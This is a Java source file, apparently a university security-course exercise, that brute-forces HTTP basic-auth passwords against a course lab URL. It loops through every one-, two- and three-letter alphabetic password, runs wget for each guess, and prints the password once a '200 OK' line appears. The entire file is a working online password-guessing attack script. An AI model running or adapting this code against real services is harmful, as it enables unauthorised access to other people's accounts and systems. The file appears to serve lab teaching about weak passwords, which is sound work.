


import java.*;
import java.io.*;

public class BruteForce
{

	public static void main(String[] args)
	{
          
          int i,j,k,counter=0;
	  String pass,temp1;
	  
          char oneTemp[] = {'a'};
	  char twoTemp[] = {'a','a'};
	  char threeTemp[] = {'a','a','a'};
	  String function= new String();
          
	  
	  Runtime rtime = Runtime.getRuntime();
	  Process prs= null;
          
	
	
	
	
	
	for(i=65;i<123;i++)
	{
		if( i > 90 && i < 97)
		     i = 97;
		oneTemp[0] = (char)i ;
		pass = new String(oneTemp);
			  
		
			  	
					 

        System.out.println(pass + " " + "Attack Number=====>" + counter++ );
          
              function ="wget --http-user= --http-passwd="+pass+" http://sec-crack.cs.rmit.edu./SEC/2/index.php";

                 
	         try
                  {
		    prs = rtime.exec(function);

                    InputStreamReader  stre = new InputStreamReader(prs.getErrorStream());
                                 
                  
                    BufferedReader bread = new BufferedReader(stre);

                    while((temp1 = bread.readLine()) != null)
                     {

			
                       if(temp1.equals("HTTP request sent, awaiting response... 200 OK"))
                       {
                              System.out.println("The password has is:"+pass);
                              System.exit(0);
                       }
                     }

	           }catch(java.io.IOException e){}
               }
	
	
	
		
	
	
	
	for(i=65;i<123;i++)
	{
		if( i > 90 && i < 97)
		     i = 97;
		for(j =65;j<123;j++)
		{
			if( j > 90 && j < 97)
			  j = 97;
			 
			twoTemp[0] = (char)i ;
			twoTemp[1] = (char)j ;
			pass = new String(twoTemp);
			  
		
			  	
					 

        System.out.println(pass + " " + "Attack Number=====>" + counter++ );
          
              function ="wget --http-user= --http-passwd="+pass+" http://sec-crack.cs.rmit.edu./SEC/2/index.php";

                 
	         try
                  {
		    prs = rtime.exec(function);

                    InputStreamReader  stre = new InputStreamReader(prs.getErrorStream());
                                 
                  
                    BufferedReader bread = new BufferedReader(stre);

                    while((temp1 = bread.readLine()) != null)
                     {

			
                       if(temp1.equals("HTTP request sent, awaiting response... 200 OK"))
                       {
                              System.out.println("The password has is:"+pass);
                              System.exit(0);
                       }
                     }

	           }catch(java.io.IOException e){}
               }
	   }
	
	
	
		
	
	
	
	
	for(i=65;i<123;i++)
	{
		if( i > 90 && i < 97)
		     i = 97;
		for(j =65;j<123;j++)
		{
			if( j > 90 && j < 97)
			  j = 97;
			  for(k = 65;k<123;k++)
			  {
			  	if( k > 90 && k < 97)
			  		{ k = 97;}
				
				threeTemp[0] = (char)i ;
				threeTemp[1] = (char)j ;
				threeTemp[2] = (char)k ;
				pass = new String(threeTemp);
			  
		
			  	
					 

        System.out.println(pass + " " + "Attack Number=====>" + counter++ );
          
              function ="wget --http-user= --http-passwd="+pass+" http://sec-crack.cs.rmit.edu./SEC/2/index.php";

                 
	         try
                  {
		    prs = rtime.exec(function);

                    InputStreamReader  stre = new InputStreamReader(prs.getErrorStream());
                                 
                  
                    BufferedReader bread = new BufferedReader(stre);

                    while((temp1 = bread.readLine()) != null)
                     {

			
                       if(temp1.equals("HTTP request sent, awaiting response... 200 OK"))
                       {
                              System.out.println("The password has is:"+pass);
                              System.exit(0);
                       }
                     }

	           }catch(java.io.IOException e){}
                }
	
		}
	   }	
	}
	
	
}
		
